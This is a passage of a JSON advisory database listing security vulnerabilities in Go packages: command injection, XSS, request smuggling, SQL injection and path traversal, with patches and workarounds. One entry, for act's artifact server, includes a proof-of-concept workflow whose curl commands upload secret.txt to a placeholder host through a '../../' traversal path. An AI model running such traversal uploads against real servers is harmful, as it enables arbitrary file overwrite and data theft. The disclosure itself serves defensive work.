1.5.0 and 1.6.0 when using the new `debug-host` feature could expose unnecessary information about the host\n\n### Patches\nUse 1.6.1 or newer\n\n### Workarounds\nDowngrade to 1.4.0 or set `debug-host` to empty\n\n### References\nhttps://github.com/fortio/proxy/pull/38\n\nQ&A https://github.com/fortio/proxy/discussions", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "fortio.org/proxy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fortio/proxy/security/advisories/GHSA-x477-fq37-q5wr"}, {"type": "WEB", "url": "https://github.com/fortio/proxy/pull/38"}, {"type": "PACKAGE", "url": "https://github.com/fortio/proxy"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-27T00:55:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qrg7-hfx7-95c5", "modified": "2023-02-08T22:37:02Z", "published": "2023-01-25T19:40:43Z", "aliases": ["CVE-2022-31249"], "summary": "Command injection in Git package in Wrangler", "details": "### Impact\n\nA command injection vulnerability was discovered in Wrangler's Git package affecting versions up to and including `v1.0.0`.\n\nWrangler's Git package uses the underlying Git binary present in the host OS or container image to execute Git operations. Specially crafted commands can be passed to Wrangler that will change their behavior and cause confusion when executed through Git, resulting in command injection in the underlying host.\n\n### Workarounds\n\nA workaround is to sanitize input passed to the Git package to remove potential unsafe and ambiguous characters. Otherwise, the best course of action is to update to a patched Wrangler version.\n\n### Patches\n\nPatched versions include `v1.0.1` and later and the backported tags - `v0.7.4-security1`, `v0.8.5-security1` and `v0.8.11`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) or [Wrangler](https://github.com/rancher/wrangler/issues/new) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.4-security1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.0"}, {"fixed": "0.8.5-security1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.1"}]}], "versions": ["1.0.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.6"}, {"fixed": "0.8.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/wrangler/security/advisories/GHSA-qrg7-hfx7-95c5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31249"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/commit/12397eec50155cb2d24aa70bdf9e90c5f3b9a727"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/commit/341018c8fef3e12867c7cb2649bd2cecac75f287"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/commit/5a387e13e8d51e3340d9e5012a1951f0cca5fc90"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/commit/8649ecc062204f28764fd80157a621cbae89c9cf"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1200299"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-qrg7-hfx7-95c5"}, {"type": "PACKAGE", "url": "https://github.com/rancher/wrangler"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/compare/v0.7.2...v0.7.4-security1"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/compare/v0.8.4...v0.8.5-security1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1519"}], "database_specific": {"cwe_ids": ["CWE-77", "CWE-78", "CWE-88"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:40:43Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x22v-qgm2-7qc7", "modified": "2023-01-12T16:49:16Z", "published": "2023-01-07T06:30:19Z", "aliases": ["CVE-2023-0110"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos prior to 0.10.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0110"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/46c13a4b7f675b92d297df6dabb4441f13c7cd9c"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/6e4a1961-dbca-46f6-ae21-c25a621e54a7"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:52:55Z", "nvd_published_at": "2023-01-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g5vm-525q-r66c", "modified": "2023-02-01T01:37:19Z", "published": "2023-01-18T21:30:21Z", "aliases": ["CVE-2023-0242"], "summary": "Velociraptor vulnerable to Missing Authorization", "details": "Rapid7 Velociraptor allows users to be created with different privileges on the server. Administrators are generally allowed to run any command on the server including writing arbitrary files. However, lower privilege users are generally forbidden from writing or modifying files on the server. The VQL copy() function applies permission checks for reading files but does not check for permission to write files. This allows a low privilege user (usually, users with the Velociraptor \"investigator\" role) to overwrite files on the server, including Velociraptor configuration files. To exploit this vulnerability, the attacker must already have a Velociraptor user account at a low privilege level (at least \"analyst\") and be able to log into the GUI and create a notebook where they can run the VQL query invoking the copy() VQL function. Typically, most users deploy Velociraptor with limited access to a trusted group (most users will be administrators within the GUI). This vulnerability is associated with program files https://github.Com/Velocidex/velociraptor/blob/master/vql/filesystem/copy.go https://github.Com/Velocidex/velociraptor/blob/master/vql/filesystem/copy.go and program routines copy(). This issue affects Velociraptor versions before 0.6.7-5. Version 0.6.7-5, released January 16, 2023, fixes the issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "www.velocidex.com/golang/velociraptor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.7-5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0242"}, {"type": "WEB", "url": "https://docs.velociraptor.app/announcements/2023-cves/#:~:text=to%20upgrade%20clients.-,CVE%2D2023%2D0242,-Insufficient%20Permission%20Check"}, {"type": "PACKAGE", "url": "https://github.com/Velocidex/velociraptor"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-01T01:37:19Z", "nvd_published_at": "2023-01-18T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5465-xc2j-6p84", "modified": "2023-02-08T21:36:10Z", "published": "2023-01-26T21:30:20Z", "aliases": ["CVE-2023-0229"], "summary": "github.com/openshift/apiserver-library-go Improper Input Validation vulnerability", "details": "A flaw was found in github.com/openshift/apiserver-library-go, used in OpenShift 4.12 and 4.11, that contains an issue that can allow low-privileged users to set the seccomp profile for pods they control to \"unconfined.\" By default, the seccomp profile used in the restricted-v2 Security Context Constraint (SCC) is \"runtime/default,\" allowing users to disable seccomp for pods they can create and modify.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openshift/apiserver-library-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20230120221150-cefee9e0162b"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0229"}, {"type": "WEB", "url": "https://github.com/openshift/apiserver-library-go/pull/97"}, {"type": "WEB", "url": "https://github.com/openshift/apiserver-library-go/commit/30f75d79e424ca462c6de53ee8b93f91183763e6"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2160349"}, {"type": "PACKAGE", "url": "github.com/openshift/apiserver-library-go"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T21:36:10Z", "nvd_published_at": "2023-01-26T21:18:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c653-6hhg-9x92", "modified": "2023-01-05T12:04:09Z", "published": "2023-01-05T12:04:09Z", "aliases": ["CVE-2023-22460"], "summary": "go-ipld-prime/codec/json may panic if asked to encode bytes", "details": "`go-ipld-prime` is a series of Go interfaces for manipulating IPLD data and a Go module that contains the `go-ipld-prime/codec/json` codec.\n\n### Impact\n\nEncoding data which contains a `Bytes` kind Node will pass a `Bytes` token to the JSON encoder which will panic as it doesn't expect to receive `Bytes` tokens. Such an encoding should be treated as an error, as plain JSON should not be able to encode Bytes.\n\n**This only impacts uses of the \"json\" codec, \"dag-json\" is not impacted.** Use of \"json\" as a decoder is not impacted.\n\n### Patches\n\nFixed in v0.19.0.\n\n### Workarounds\n\nPrefer the \"dag-json\" codec which has the ability to [encode bytes](https://ipld.io/specs/codecs/dag-json/spec/#bytes).\n\n### References\n\nSee fix in [#472](https://github.com/ipld/go-ipld-prime/pull/472)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipld/go-ipld-prime"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.19.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipld/go-ipld-prime/security/advisories/GHSA-c653-6hhg-9x92"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22460"}, {"type": "WEB", "url": "https://github.com/ipld/go-ipld-prime/pull/472"}, {"type": "WEB", "url": "https://github.com/ipld/go-ipld-prime/commit/146d1c8529676fe9ee0604f014656af2395505fc"}, {"type": "PACKAGE", "url": "https://github.com/ipld/go-ipld-prime"}, {"type": "WEB", "url": "https://github.com/ipld/go-ipld-prime/releases/tag/v0.19.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1269"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-05T12:04:09Z", "nvd_published_at": "2023-01-04T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r894-5r7v-7rx3", "modified": "2023-01-12T23:40:22Z", "published": "2023-01-07T09:30:17Z", "aliases": ["CVE-2014-125055"], "summary": "easy-scrypt Observable Timing Discrepancy vulnerability", "details": "A vulnerability, which was classified as problematic, was found in agnivade easy-scrypt. Affected is the function `VerifyPassphrase` of the file `scrypt.go`. The manipulation leads to observable timing discrepancy. Upgrading to version 1.0.0 can address this issue. The name of the patch is 477c10cf3b144ddf96526aa09f5fdea613f21812. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-217596.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/agnivade/easy-scrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-125055"}, {"type": "WEB", "url": "https://github.com/agnivade/easy-scrypt/commit/477c10cf3b144ddf96526aa09f5fdea613f21812"}, {"type": "PACKAGE", "url": "https://github.com/agnivade/easy-scrypt"}, {"type": "WEB", "url": "https://github.com/agnivade/easy-scrypt/releases/tag/v1.0.0"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.217596"}, {"type": "WEB", "url": "https://vuldb.com/?id.217596"}], "database_specific": {"cwe_ids": ["CWE-208"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-12T23:40:22Z", "nvd_published_at": "2023-01-07T09:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fxg5-wq6x-vr4w", "modified": "2023-10-02T11:29:22Z", "published": "2023-01-14T00:30:23Z", "aliases": ["CVE-2022-41721"], "summary": "golang.org/x/net/http2/h2c vulnerable to request smuggling attack", "details": "A request smuggling attack is possible when using MaxBytesHandler. When using MaxBytesHandler, the body of an HTTP request is not fully consumed. When the server attempts to read HTTP2 frames from the connection, it will instead be reading the body of the HTTP request, which could be attacker-manipulated to represent arbitrary HTTP2 requests.\n\n### Specific Go Packages Affected\ngolang.org/x/net/http2/h2c", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.0-20220524220425-1d687d428aca"}, {"fixed": "0.1.1-0.20221104162952-702349b0e862"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41721"}, {"type": "PACKAGE", "url": "https://cs.opensource.google/go/x/net"}, {"type": "WEB", "url": "https://go.dev/cl/447396"}, {"type": "WEB", "url": "https://go.dev/issue/56352"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/X3H3EWQXM2XL5AGBX6UL443JEJ3GQXJN/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1495"}], "database_specific": {"cwe_ids": ["CWE-444"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-20T22:40:06Z", "nvd_published_at": "2023-01-13T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pc99-qmg4-rcff", "modified": "2023-02-03T20:47:31Z", "published": "2023-01-20T16:00:36Z", "aliases": ["CVE-2023-22726"], "summary": "act vulnerable to arbitrary file upload in artifact server", "details": "### Impact\nThe artifact server that stores artifacts from Github Action runs does not sanitize path inputs. This allows an attacker to download and overwrite arbitrary files on the host from a Github Action. This issue may lead to privilege escalation.\n\n\n#### Issue 1: Arbitrary file upload in artifact server (GHSL-2023-004)\nThe [/upload endpoint](https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#LL103C2-L103C2) is vulnerable to path traversal as filepath is user controlled, and ultimately flows into os.Mkdir and os.Open.\n\n```\nrouter.PUT(\"/upload/:runId\", func(w http.ResponseWriter, req *http.Request, params httprouter.Params) {\n\t\titemPath := req.URL.Query().Get(\"itemPath\")\n\t\trunID := params.ByName(\"runId\")\n\n\t\tif req.Header.Get(\"Content-Encoding\") == \"gzip\" {\n\t\t\titemPath += gzipExtension\n\t\t}\n\n\t\tfilePath := fmt.Sprintf(\"%s/%s\", runID, itemPath)\n```\n\n#### Issue 2: Arbitrary file download in artifact server (GHSL-2023-004)\nThe [/artifact endpoint](https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#L245) is vulnerable to path traversal as the path is variable is user controlled, and the specified file is ultimately returned by the server.\n\n```\nrouter.GET(\"/artifact/*path\", func(w http.ResponseWriter, req *http.Request, params httprouter.Params) {\n\t\tpath := params.ByName(\"path\")[1:]\n\n\t\tfile, err := fsys.Open(path)\n```\n\n#### Proof of Concept\nBelow I have written a Github Action that will upload secret.txt into the folder above the specified artifact directory. The first call to curl will create the directory named 1 if it does not already exist, and the second call to curl will upload the secret.txt file to the directory above the specified artifact directory.\n\nWhen testing this POC, the `--artifact-server-path` parameter must be passed to act in order to enable the artifact server.\nReplace yourIPandPort with the IP and port of the server. An attacker can enumerate /proc/net/tcp in order to find the artifact server IP and port, but this is out of the scope of this report. Please let me know if you would like a copy of this script.\n\n```\nname: CI\non: push\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n    - run: echo \"Here are some secrets\" > secret.txt\n    - run: curl http://<yourIPandPort>/upload/1?itemPath=secret.txt --upload-file secret.txt\n    - run: curl http://<yourIPandPort>/upload/1?itemPath=../../secret.txt --upload-file secret.txt\n```\n\n### Remediation\n1. During implementation of [Open and OpenAtEnd for FS](https://github.com/nektos/act/blob/master/pkg/artifacts/server.go#L65), please ensure to use ValidPath() to check against path traversal. See more here: https://pkg.go.dev/io/fs#FS\n2. Clean the user-provided paths manually\n\n### Patches\nVersion 0.2.40 contains a patch.\n\n### Workarounds\nAvoid use of artifact server with `--artifact-server-path`", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nektos/act"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.2.40"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.2.39"}}], "references": [{"type": "WEB", "url": "https://github.com/nektos/act/security/advisories/GHSA-pc99-qmg4-rcff"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22726"}, {"type": "WEB", "url": "https://github.com/nektos/act/issues/1553"}, {"type": "WEB", "url": "https://github.com/nektos/act/commit/63ae215071f94569d910964bdee866d91d6e3a10"}, {"type": "PACKAGE", "url": "https://github.com/nektos/act"}, {"type": "WEB", "url": "https://github.com/nektos/act/blob/master/pkg/artifacts/server.go#L65"}, {"type": "WEB", "url": "https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#L245"}, {"type": "WEB", "url": "https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#LL103C2-L103C2"}, {"type": "WEB", "url": "https://github.com/nektos/act/releases/tag/v0.2.40"}, {"type": "ADVISORY", "url": "https://securitylab.github.com/advisories/GHSL-2023-004_act/"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-434"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-20T16:00:36Z", "nvd_published_at": "2023-01-20T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hj4g-4w36-x8hp", "modified": "2023-01-27T21:42:18Z", "published": "2023-01-20T18:30:22Z", "aliases": ["CVE-2022-47747"], "summary": "Kraken has arbitrary file read vulnerability via component testfs", "details": "kraken <= 0.1.4 has an arbitrary file read vulnerability via the component `testfs`.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/uber/kraken"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.1.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-47747"}, {"type": "WEB", "url": "https://github.com/uber/kraken/issues/333"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-hj4g-4w36-x8hp"}, {"type": "PACKAGE", "url": "https://github.com/uber/kraken"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-20T21:56:09Z", "nvd_published_at": "2023-01-20T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-89qm-wcmw-3mgg", "modified": "2023-01-09T19:45:35Z", "published": "2023-01-09T19:45:35Z", "aliases": ["CVE-2022-23509"], "summary": "Gitops Run insecure communication", "details": "### Impact\nGitOps run has a local S3 bucket which it uses for synchronising files that are later applied against a Kubernetes cluster. The communication between GitOps Run and the local s3 bucket is not encrypted. \n\nThis allows privileged users or process to tap the local traffic to gain information permitting access to the s3 bucket. From that point, it would be possible to alter the bucket content, resulting in changes in the Kubernetes cluster's resources(e.g. CVE-2022-23508).\n\n### Patches\nThis vulnerability has been fixed by commits [ce2bbff](https://github.com/weaveworks/weave-gitops/pull/3106/commits/ce2bbff0a3609c33396050ed544a5a21f8d0797f) and [babd915](https://github.com/weaveworks/weave-gitops/pull/3098/commits/babd91574b99b310b84aeec9f8f895bd18acb967). Users should upgrade to Weave GitOps version >= v0.12.0 released on 08/12/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Paulo Gomes, Senior Software Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n- Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops)\n- Email us at [support@weave.works](mailto:support@weave.works)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaveworks/weave-gitops"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.11.0"}}], "references": [{"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/security/advisories/GHSA-89qm-wcmw-3mgg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23509"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/pull/3098/commits/babd91574b99b310b84aeec9f8f895bd18acb967"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/pull/3106/commits/ce2bbff0a3609c33396050ed544a5a21f8d0797f"}, {"type": "PACKAGE", "url": "https://github.com/weaveworks/weave-gitops"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-319"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T19:45:35Z", "nvd_published_at": "2023-01-09T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g7mw-9pf9-p2pm", "modified": "2023-01-12T23:40:45Z", "published": "2023-01-07T21:30:39Z", "aliases": ["CVE-2014-125064"], "summary": "gosqljson SQL Injection vulnerability", "details": "A vulnerability, which was classified as critical, has been found in elgs gosqljson. This issue affects the function `QueryDbToArray/QueryDbToMap/ExecDb` of the file `gosqljson.go`. The manipulation of the argument sqlStatement leads to sql injection. The name of the patch is 2740b331546cb88eb61771df4c07d389e9f0363a. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-217631.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/elgs/gosqljson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220916234230-750f26ee23c7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-125064"}, {"type": "WEB", "url": "https://github.com/elgs/gosqljson/commit/2740b331546cb88eb61771df4c07d389e9f0363a"}, {"type": "PACKAGE", "url": "https://github.com/elgs/gosqljson"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1494"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.217631"}, {"type": "WEB", "url": "https://vuldb.com/?id.217631"}], "database_specific": {"cwe_ids": ["CWE-89"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-01-12T23:40:45Z", "nvd_published_at": "2023-01-07T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v4w5-r2xc-7f8h", "modified": "2023-07-21T18:02:01Z", "published": "2023-01-09T21:57:10Z", "aliases": ["CVE-2023-22479"], "summary": "KubePi session fixation attack allows an attacker to hijack a legitimate user session.", "details": "### Summary\nA session fixation attack allows an attacker to hijack a legitimate user session. The attack investigates a flaw in how the online application handles the session ID, especially the susceptible web application.\n\n### Affected Version\n<= v1.6.3\n\n### Patches\nThe vulnerability has been fixed in [v1.6.4](https://github.com/KubeOperator/KubePi/releases/tag/v1.6.4).\n\nhttps://github.com/KubeOperator/KubePi/commit/1e9c550356c1a425a742480efcf743d373e98dcb : A session fixation attack allows an attacker to hijack a legitimate user session.\n\n### Workarounds\nIt is recommended to upgrade the version to [v1.6.4](https://github.com/KubeOperator/KubePi/releases/tag/v1.6.4).\n\n### For more information\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/KubeOperator/KubePi/issues).\n\nThis vulnerability is reported by [sachinh09](https://huntr.dev/users/sachinh09/) from [huntr.dev](https://huntr.dev/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/KubeOperator/kubepi"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.6.3"}}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-v4w5-r2xc-7f8h"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/security/advisories/GHSA-v4w5-r2xc-7f8h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22479"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/commit/1e9c550356c1a425a742480efcf743d373e98dcb"}, {"type": "PACKAGE", "url": "https://github.com/KubeOperator/KubePi"}, {"type": "WEB", "url": "https://github.com/KubeOperator/KubePi/releases/tag/v1.6.4"}], "database_specific": {"cwe_ids": ["CWE-384"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T21:57:10Z", "nvd_published_at": "2023-01-10T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3vp4-m3rf-835h", "modified": "2023-05-11T14:03:52Z", "published": "2023-05-04T06:30:12Z", "aliases": ["CVE-2023-26125"], "summary": "Improper input validation in github.com/gin-gonic/gin", "details": "Versions of the package github.com/gin-gonic/gin before version 1.9.0 are vulnerable to Improper Input Validation by allowing an attacker to use a specially crafted request via the X-Forwarded-Prefix header, potentially leading to cache poisoning.\n\n**Note:** Although this issue does not pose a significant threat on its own it can serve as an input vector for other more impactful vulnerabilities. However, successful exploitation may depend on the server configuration and whether the header is used in the application logic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gin-gonic/gin"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26125"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/3500"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/pull/3503"}, {"type": "WEB", "url": "https://github.com/t0rchwo0d/gin/commit/fd9f98e70fb4107ee68c783482d231d35e60507b"}, {"type": "PACKAGE", "url": "https://github.com/gin-gonic/gin"}, {"type": "WEB", "url": "https://github.com/gin-gonic/gin/releases/tag/v1.9.0"}, {"type": "WEB", "url": "https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-3324285"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-05T02:20:00Z", "nvd_published_at": "2023-05-04T05:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-92wq-q9pq-gw47", "modified": "2023-05-25T19:07:49Z", "published": "2023-05-17T17:07:40Z", "aliases": ["CVE-2023-31135"], "summary": "Dgraph Audit Log Encryption Vulnerability", "details": "### Impact\nExisting Dgraph audit logs are vulnerable to brute force attacks due to nonce collisions.  All audit logs generated by versions of Dgraph <v23.0.0 are affected.\n\n### Patches\nThis issue was patched in https://github.com/dgraph-io/dgraph/pull/8323.  Dgraph users should upgrade to v23.0.0.\n\n### Workarounds\nStore existing audit logs in a secure location.  For extra security, encrypt using a tool like `gpg`.\n\n### References\nSee https://github.com/dgraph-io/dgraph/pull/8323 for more context on the vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dgraph-io/dgraph"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "23.0.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dgraph-io/dgraph/security/advisories/GHSA-92wq-q9pq-gw47"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-31135"}, {"type": "WEB", "url": "https://github.com/dgraph-io/dgraph/pull/8323"}, {"type": "WEB", "url": "https://en.wikipedia.org/wiki/Cryptographic_nonce"}, {"type": "PACKAGE", "url": "https://github.com/dgraph-io/dgraph"}, {"type": "WEB", "url": "https://github.com/dgraph-io/dgraph/releases/tag/v23.0.0"}], "database_specific": {"cwe_ids": 